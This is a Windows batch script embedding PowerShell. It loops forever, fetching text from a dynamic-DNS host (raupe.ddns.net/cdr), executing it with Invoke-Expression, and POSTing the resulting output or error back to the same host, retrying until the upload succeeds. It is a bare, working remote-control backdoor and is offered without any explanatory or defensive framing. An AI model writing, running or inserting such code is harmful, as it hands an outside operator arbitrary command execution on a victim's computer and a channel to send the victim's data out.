@echo off
setlocal

set "url=raupe.ddns.net/cdr"

:loop
    echo Sending GET request to %url%
    powershell -Command ^
        "$response = Invoke-WebRequest -Uri '%url%' -Method Get -TimeoutSec 9; ^
        $receivedData = $response.Content; ^
        if (-not [string]::IsNullOrWhiteSpace($receivedData)) { ^
            try { ^
                Invoke-Expression $receivedData | Tee-Object -Variable out; ^
                Write-Host 'Output from expression: ' $out; ^
                Start-Sleep -Seconds 1; ^
                $headers = @{ 'Content-Type' = 'text/plain'; 'Content-Length' = [System.Text.Encoding]::UTF8.GetByteCount($out) }; ^
            } catch { ^
                $errorMessage = $_.Exception.Message; ^
                Write-Host 'Error executing expression: ' $errorMessage; ^
                $out = $errorMessage; ^
                $headers = @{ 'Content-Type' = 'text/plain'; 'Content-Length' = [System.Text.Encoding]::UTF8.GetByteCount($errorMessage) }; ^
            } ^
            $postSuccess = $false; ^
            while (-not $postSuccess) { ^
                try { ^
                    Write-Host 'Sending POST request with content length ' $($headers['Content-Length']); ^
                    Invoke-WebRequest -Uri '%url%' -Method Post -Body $out -Headers $headers -TimeoutSec 20; ^
                    $postSuccess = $true; ^
                } catch { ^
                    Write-Host 'POST request failed. Retrying in 2 seconds...'; ^
                    Start-Sleep -Seconds 2; ^
                } ^
            } ^
        }"
    timeout /t 10 /nobreak
goto loop

endlocal
